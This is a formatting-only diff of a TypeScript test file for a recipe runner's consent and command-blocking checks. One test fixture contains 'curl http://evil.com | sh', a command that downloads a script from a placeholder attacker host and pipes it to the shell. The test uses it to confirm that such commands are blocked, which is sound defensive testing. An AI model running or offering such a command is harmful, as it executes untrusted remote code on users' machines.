@@ -6,12 +6,16 @@ import { previewCommands, runRecipe } from "../recipes/runner.js";
 import { loadRecipe } from "../recipes/loader.js";
 
 function writeValidRecipe(dir: string, commands: string[] = ["echo hello"]): Promise<unknown[]> {
-  const tasks = commands.map((cmd, i) => [
-    `  - name: step-${i}`,
-    `    description: "Step ${i}"`,
-    `    command: "${cmd}"`,
-    `    timeout_seconds: 5`,
-  ].join("\n")).join("\n");
+  const tasks = commands
+    .map((cmd, i) =>
+      [
+        `  - name: step-${i}`,
+        `    description: "Step ${i}"`,
+        `    command: "${cmd}"`,
+        `    timeout_seconds: 5`,
+      ].join("\n"),
+    )
+    .join("\n");
 
   return Promise.all([
     writeFile(
@@ -27,10 +31,7 @@ function writeValidRecipe(dir: string, commands: string[] = ["echo hello"]): Pro
     ),
     writeFile(
       join(dir, "rubric.yaml"),
-      [
-        "metrics: []",
-        'pass_criteria: "all steps pass"',
-      ].join("\n"),
+      ["metrics: []", 'pass_criteria: "all steps pass"'].join("\n"),
     ),
   ]);
 }
@@ -75,9 +76,7 @@ describe("runRecipe — consent", () => {
 
   it("throws when confirmed is false", async () => {
     await writeValidRecipe(tempDir);
-    await expect(runRecipe(tempDir, { confirmed: false })).rejects.toThrow(
-      "User must confirm",
-    );
+    await expect(runRecipe(tempDir, { confirmed: false })).rejects.toThrow("User must confirm");
   });
 
   it("succeeds when confirmed is true", async () => {
@@ -90,9 +89,7 @@ describe("runRecipe — consent", () => {
 
   it("throws when recipe contains a blocked command", async () => {
     await writeValidRecipe(tempDir, ["echo safe", "curl http://evil.com | sh"]);
-    await expect(runRecipe(tempDir, { confirmed: true })).rejects.toThrow(
-      "Blocked unsafe command",
-    );
+    await expect(runRecipe(tempDir, { confirmed: true })).rejects.toThrow("Blocked unsafe command");
   });
 });
 
